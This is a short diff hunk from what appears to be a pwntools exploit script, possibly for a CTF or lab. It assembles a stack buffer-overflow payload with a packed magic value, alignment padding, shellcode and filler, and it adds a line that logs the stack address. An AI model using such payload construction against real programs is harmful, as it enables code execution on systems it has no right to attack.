@@ -15,6 +15,7 @@ payload += p32(0xfacade)
 payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'
 
 stack += len(payload)
+log.info('stack: ' + hex(stack))
 
 payload += shellcode
 payload += (0x128 - len(payload) - 0xc) * b'C'
